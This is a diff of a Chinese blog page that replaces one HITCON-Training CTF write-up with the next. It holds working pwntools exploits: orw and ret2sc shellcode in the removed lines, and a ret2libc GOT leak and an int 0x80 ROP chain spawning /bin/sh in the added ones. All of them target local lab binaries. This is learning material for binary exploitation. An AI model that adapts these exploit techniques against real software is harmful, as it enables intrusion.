@@ -249,13 +249,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Pwn-10月23-Hitcon(一)
+                        Pwn-10月24-hitcon(二)
                     </div>
                 </div>
             </div>
@@ -368,7 +368,7 @@
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2018-10-23
+                    <i class="fa fa-clock-o fa-fw"></i>2018-10-24
                 </span>
             </div>
         </div>
@@ -376,140 +376,130 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>[TOC]</p>
-<h1 id="Pwn-10月23-Hitcon-一"><a href="#Pwn-10月23-Hitcon-一" class="headerlink" title="Pwn-10月23-Hitcon(一)"></a>Pwn-10月23-Hitcon(一)</h1><blockquote>
-<p>继续二进制修炼，今天开始肝Hiton-training，膜着<a href="https://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">m4x</a>，以及另一位大佬<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">23R3F</a>的题解蹒跚前行。</p>
+<h1 id="Pwn-10月24-hitcon-二"><a href="#Pwn-10月24-hitcon-二" class="headerlink" title="Pwn-10月24-hitcon(二)"></a>Pwn-10月24-hitcon(二)</h1><blockquote>
+<p>继续hitcon的解题之路。</p>
 </blockquote>
-<h2 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h2><blockquote>
-<p>貌似第一题会比较简单，先用IDA-Pro静态分析一下：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf0b64c261c.png" alt=""></p>
-<p>貌似直接得到了一个能够输出flag的函数？由于这是个elf32位可执行文件所以我们需要在linux下面执行：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf0332abc98.png" alt=""></p>
-<p>可以很简单就看懂逻辑，输入一个值，然后比较如果相等，得出flag。</p>
+<h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><blockquote>
+<p>拿到题目看题目名，和lab3的ret2sc差不多，这个应该是return to libc，也是一种攻击手法。泄露libc并且leak出libc基地址，从而getshell？😄</p>
 </blockquote>
-<h3 id="解法1-patch"><a href="#解法1-patch" class="headerlink" title="解法1 - patch"></a>解法1 - patch</h3><blockquote>
-<p>IDA Pro – keypatch，使用<code>keypatch</code>插件来修改汇编代码，我们可以直接将关键的一步nop掉或者改成完全相反的操作。</p>
-</blockquote>
-<p><img src="https://i.loli.net/2018/10/23/5bcf05f6b8d06.png" alt=""></p>
-<blockquote>
-<p>例如将<code>.text:08048722</code>的跳转汇编指令改为jmp无条件跳转，或者是与jnz相反的jz操作。</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf075963ea4.png" alt=""></p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf07b5548dc.png" alt=""></p>
-<p>修改为无条件跳转后需要将其保存到对应文件中：<br><img src="https://i.loli.net/2018/10/23/5bcf07f4c58d9.png" alt=""></p>
-<p>然后去把文件挪到linux上运行试试发现并没有用，因为改为jmp后其函数直接少了一部分对flag的操作：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf0a2f45481.png" alt=""></p>
-<p>所以我们只能将原样本中的jnz改为jz了，改完之后函数已经成为不等则输出flag了：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf0bd4dce1d.png" alt=""></p>
-<p>运行效果：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf0c1461b1f.png" alt=""></p>
-</blockquote>
-<h3 id="解法2-gdb-set-register-value"><a href="#解法2-gdb-set-register-value" class="headerlink" title="解法2 - gdb set register value"></a>解法2 - gdb set register value</h3><blockquote>
-<p>通过gdb动态调试，并且在即将进行比较前，将 eax置为与edx相同的值即可：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf0e78806d2.png" alt=""></p>
-<p>然后即可得到flag。</p>
-</blockquote>
-<h2 id="lab2-orw"><a href="#lab2-orw" class="headerlink" title="lab2-orw"></a>lab2-orw</h2><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote>
-<p><code>checksec orw.bin</code>，题目orw的意思是open，read，write这三个函数。</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf0fca60256.png" alt=""></p>
-<p>emmm这是我做的第一个开启了Stack保护的题目呢。</p>
+<h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote>
+<p><code>checksec ret2lib</code>:</p>
+<p><img src="https://i.loli.net/2018/10/24/5bcffda0c6f43.png" alt=""></p>
 </blockquote>
 <h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote>
-<p>简单跑一下可以看到直接是让你输入shellcode：<br><img src="https://i.loli.net/2018/10/23/5bcf104eea350.png" alt=""></p>
-<p>放IDA pro里面看看：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf15e2dd0aa.png" alt=""></p>
-<p>细看一下<code>orw_seccomp()函数</code>:</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf16ed762fb.png" alt=""></p>
-<p>prctl函数又是啥玩意儿？Prctl(用户和内核沟通的一个绝佳函数),这个函数可以对进程进行一些设置。<a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">而有一道强网杯题目就好像用了这玩意儿的技术？</a></p>
-<p>输入shellcode之后应该会执行，所以这题的目的是让我们自己构造shellcode去读取flag？既然要构造shellcode，那就需要用到pwntools的asm模块和shellcraft模块：</p>
-<p>asm模块是将操作转换为汇编命令，而shellcraft是具有各种函数对应汇编命令的一个模块，十分好用：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf1996469a4.png" alt=""></p>
-<p>pwntools中的context模块又是用来干嘛的呢？</p>
-<p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p>
-<p>例如<code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code></p>
-<p>这句话的意思是： </p>
-<ol>
-<li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li>
-<li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li>
-<li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li>
-</ol>
-</blockquote>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>根据题意和题解😂（正处于涨姿势的时候）写出exp：</p>
-<pre class=" language-python"><code class="language-python">
-<span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
-<span class="token comment" spellcheck="true">#coding:utf-8</span>
-
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> shellcraft <span class="token keyword">as</span> sc
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
-
-shellcode <span class="token operator">=</span> sc<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span><span class="token string">"/home/xiaoyifeng/ctf/pwn/Hiton/lab2/flag"</span><span class="token punctuation">)</span>
-shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"esp"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#  open返回的文件文件描述符存贮在eax寄存器里 </span>
-shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"eax"</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#  open读取的内容放在栈顶 </span>
-<span class="token comment" spellcheck="true">#  write函数在栈顶读取0x100大小的内容并打印出来</span>
-shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
-
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./orw.bin"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#print(asm(shellcode))</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
+<p>简单跑一下：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd0000628c22.png" alt=""></p>
+<p>程序让我们输入一个地址，以整型的形式输入，然后它会返回这个地址存有的内容给我们，然后让我们<code>leave some message</code>，并且打印出来，我们可以通过这个功能从GOT表中将一些函数的真实地址打印出来，然后通过libc文件中函数的偏移量计算基地址，例如将某一个函数的GOT条目的地址传给write函数，就可以泄漏这个函数在进程空间中的真实地址，<strong>GOT表中所存的puts函数的地址便是在ret2lib进程中的实际地址。</strong></p>
+<p>IDA里面看看：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd003fbb31e4.png" alt=""></p>
+<p>通过命令<code>readelf -V ret2lib</code>可以查到其libc库版本为<code>libc.so.6</code>：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd009e18b194.png" alt=""></p>
+<p>通过pwntools的elf模块我们可以链接该libc.so.6库，简单看看里面的函数地址：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd00c1190711.png" alt=""></p>
+<p>同样针对这题可以使用IDA <code>alt + t</code>来查找GOT表puts地址，也可通过上述ELF模块链接ret2lib程序，通过<code>elf.got[&#39;puts&#39;]</code>来获取GOT表中puts条目地址:</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd00d4fb5348.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/24/5bd00d70f16de.png" alt=""></p>
+<p>将134520860作为我们需要获得内容的地址输入程序：</p>
+<pre class=" language-bash"><code class="language-bash">Do you know <span class="token keyword">return</span> to library ?
+<span class="token comment" spellcheck="true">###############################</span>
+What <span class="token keyword">do</span> you want to see <span class="token keyword">in</span> memory?
+Give me an address <span class="token punctuation">(</span>in dec<span class="token punctuation">)</span> :134520860                                           
+The content of the address <span class="token keyword">:</span> 0xf7639250
 </code></pre>
-<p>运行效果：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf2cbec3db2.png" alt=""></p>
-<h2 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h2><blockquote>
-<p>题目名是return to shellcode的简写，应该是利用return返回然后执行shellcode之类的操作？</p>
+<p>然后我们就得到了puts函数条目在存在GOT表中的内容，即<strong>此次</strong>程序运行时puts函数的真实地址<code>0xf7639250</code>。</p>
+<p>libc基地址计算：<strong>libcbase_addr = puts_addr - libc_puts = 0xf7639250 - 0x67250 = 0xf75d2000</strong></p>
+<p>这里我只是简单的展示一下计算方法，实际上在程序运行过程中libc的<strong>基地址是会发生变化的</strong>，所以不能提前计算好基地址，再写exp，要在exp里面计算基地址，这样就不会出错。</p>
+<p>既然已经可以计算出system函数的地址了，那么我们就需要找一个sh，可以寻找binary程序本身中的字符串，也可以使用libc中的：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd012dbb4bb5.png" alt=""></p>
+<p>然后我们可以通过Print_message()函数溢出，覆盖EIP的值使其跳转执行system函数：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd017ba13b3e.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/24/5bd018a67369c.png" alt=""></p>
+<p>可以看到padding长度为60，接下来写exp即可.</p>
 </blockquote>
-<h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote>
-<p><code>checksec ret2sc</code></p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf21774fa88.png" alt=""></p>
-<p>emmm没有开启啥保护，没有开启栈溢出检测，也没有开启栈不可执行（NX）。</p>
-</blockquote>
-<h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote>
-<p>跑一下发现让我们输入字符串到Name里面，还有一个try your best？首先想到的是会不会又是啥栈溢出什么的。</p>
-</blockquote>
-<blockquote>
-<p> <img src="https://i.loli.net/2018/10/23/5bcf212fdd23f.png" alt=""></p>
-</blockquote>
-<blockquote>
-<p>嗯，情况是有的：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf22016964b.png" alt=""></p>
-<p>通过gdb动态调试可以发现在输入try your best 的值的时候可以发生溢出，并且将EIP指向我们构造的位置：</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf25189cf77.png" alt=""></p>
-<p>而这个临界值我们可以通过pattern search来查我们构造的pattern偏移量，得到为32。根据大佬的题解了解到return to shellcode是一种题型，我甚至想到了又用ROP chain???<code>黑人问号.jpg</code>😭。</p>
-<p>原来return to shellcode的操作就是将shellcode写入name变量空间，然后通过返回到该地址从而执行shellcode(NX未开启，栈可执行)</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcf2a86e5630.png" alt=""></p>
-<p>该变量地址为0x804A060</p>
-</blockquote>
-<h3 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h3><blockquote>
-<p>这个exp需要用到shellcraft和asm，来将shellcode转为汇编指令：</p>
+<h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><blockquote>
+<p>libcbase_addr = puts_addr - libc_puts</p>
+<p>system_addr = libcbase_addr + libc.symbols[‘system’]</p>
+<p>return_addr = ‘anything’</p>
+<p>exp:</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
 <span class="token comment" spellcheck="true">#coding:utf-8</span>
 
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
 
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2sc"</span><span class="token punctuation">)</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+libc_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
 
-<span class="token comment" spellcheck="true">#获得sh的命令多种多样，并且有不同系统版本的sh</span>
-<span class="token comment" spellcheck="true">#shellcode = asm(shellcraft.execve("/bin/sh"))</span>
-shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" : "</span><span class="token punctuation">)</span>
+libcbase_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc_puts
+return_addr <span class="token operator">=</span> <span class="token number">0x0804857D</span> <span class="token comment" spellcheck="true">#main函数地址</span>
 
-<span class="token comment" spellcheck="true">#flat模块能将pattern字符串和地址结合并且转为字节模式</span>
-payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x804a060</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">"libcbase_addr -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcbase_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libcbase_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> return_addr<span class="token punctuation">,</span> next<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#sh\x00是因为可能匹配到其他字符串，从而加个截断</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
 
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+</blockquote>
+<p>运行效果：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd01b3e9b344.png" alt=""></p>
+<h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h2><blockquote>
+<p>simplerop ==&gt; easyrop ==&gt; babyrop?经历绝望的过程😭，又是一个构造ropchain的题目。</p>
+</blockquote>
+<h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote>
+<p><code>checksec ./simplerop</code></p>
+<p><img src="https://i.loli.net/2018/10/24/5bd02cfbed61f.png" alt=""></p>
+<p>开启了NX，栈不可执行防护。</p>
+</blockquote>
+<h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote>
+<p>通过ida看看：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd037bdc39d0.png" alt=""></p>
+<p>逻辑十分简单，就溢出然后构造rop chain，通过gdb动态调试得到溢出点，padding为32：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd0380835b4e.png" alt=""></p>
+<p>但是这个题型貌似叫：<code>ret2systemcall</code>，此程序中既无system函数，也无/bin/sh字符串，还是静态编译，新姿势 ==&gt;rop chain后 int 0x80中断从而执行系统调用==&gt; <code>execve(/bin/sh)</code>。</p>
+<p><strong>原理：通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(“/bin/sh”, 0, 0)</strong></p>
+<p><img src="https://i.loli.net/2018/10/24/5bd03efc07ec3.png" alt=""></p>
+</blockquote>
+<p>不知道为啥我的ROPgadget查不到我们想要的gadget。</p>
+<h3 id="构造exp-1"><a href="#构造exp-1" class="headerlink" title="构造exp"></a>构造exp</h3><blockquote>
+<p>exp:</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true">#coding:utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>  
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  
+
+pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806eca0</span>  
+pop_eax <span class="token operator">=</span> <span class="token number">0x080b7e26</span>  
+pop_edx <span class="token operator">=</span> <span class="token number">0x0806ec7a</span>  
+int_80 <span class="token operator">=</span> <span class="token number">0x0806c8f5</span>  
+gadget <span class="token operator">=</span> <span class="token number">0x080707b9</span> <span class="token comment" spellcheck="true"># mov word ptr [edx],eax  </span>
+bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>  
+
+
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  
+payload <span class="token operator">+=</span>  p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/sh\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> 
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>  
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>  
+
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 </code></pre>
-<p>运行效果：</p>
 </blockquote>
-<p><img src="https://i.loli.net/2018/10/23/5bcf2c13d7442.png" alt=""></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>内容涉及 context 模式设置，asm模块，shellcraft模块，patch操作，return to shellcode题型，pwntools flat模块。</p>
-<p>今天先混到这儿。。。我真菜😭。</p>
+<p>运行效果：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd043f350073.png" alt=""></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>内容涉及: libc泄露，leak libc基地址，ropchain系统调用（int 0x80）。</p>
+<p>ropchain系统调用原理：在无system函数，/bin/sh可用的情况下，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(“/bin/sh”, 0, 0)。</p>
 
             </div>
             <hr/>
@@ -648,7 +638,7 @@ io<span class="token punctuation">.</span>close<span class="token punctuation">(
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="http://www.yof3ng.xyz" class="b-link-green">Yof3ng's Blog | 热爱分享</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2018/10/23/Pwn-10月23/" class="b-link-green">Pwn-10月23-Hitcon(一)</a>
+                    <a href="/2018/10/24/Pwn-10月24-hitcon-二/" class="b-link-green">Pwn-10月24-hitcon(二)</a>
                 </p>
             </div>
         </div>
@@ -670,7 +660,7 @@ io<span class="token punctuation">.</span>close<span class="token punctuation">(
         repo: 'yof3ng.github.io',
         owner: 'Yof3ng',
         admin: "Yof3ng",
-        id: '2018-10-23T18-52-55',
+        id: '2018-10-24T12-45-45',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -687,8 +677,8 @@ io<span class="token punctuation">.</span>close<span class="token punctuation">(
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">上一篇</div>
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">本篇</div>
             <div class="card">
                 <a href="/2018/10/24/Pwn-10月24-hitcon-二/">
                     <div class="card-image">
@@ -707,9 +697,66 @@ Pwn-10月24-hitcon(二)
 lab4 - ret2lib
 拿到题目看题目名，和lab3的ret2sc差不多，这个应该是return to libc，也是一种攻击手法。泄露libc并且l</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-24
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Pwn/" target="_blank">
+                        <span class="chip bg-color">Pwn</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/" target="_blank">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/二进制安全/" target="_blank">
+                        <span class="chip bg-color">二进制安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">下一篇</div>
+            <div class="card">
+                <a href="/2018/10/23/Pwn-10月23/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Pwn-10月23-Hitcon(一)">
+                        
+                        <span class="card-title">Pwn-10月23-Hitcon(一)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">[TOC]
+Pwn-10月23-Hitcon(一)
+继续二进制修炼，今天开始肝Hiton-training，膜着m4x，以及另一位大佬23R3F的题解蹒跚前行。
+
+lab1-sysmagic
+貌似第一题会比较简单，先用IDA-Pro静态分析</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -742,64 +789,6 @@ lab4 - ret2lib
             </div>
         </div>
         
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">下一篇</div>
-            <div class="card">
-                <a href="/2018/10/22/Re-10月22-shiyanbar-10000/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Re-10月22-shiyanbar-10000">
-                        
-                        <span class="card-title">Re-10月22-shiyanbar-10000</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary">[TOC]
-Re-10月22-shiyanbar-10000
-emmm记录一下实验吧里一道简单的逆向，实际上就是一种思维方式。
-
-
-拿到一个exe文件,运行效果如下：
-
-对没错就是一个喵字，然后输入内容，会输出wrong，可以猜测输入了正确</div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-22
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CTF/" class="post-category" target="_blank">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/二进制安全/" target="_blank">
-                        <span class="chip bg-color">二进制安全</span>
-                    </a>
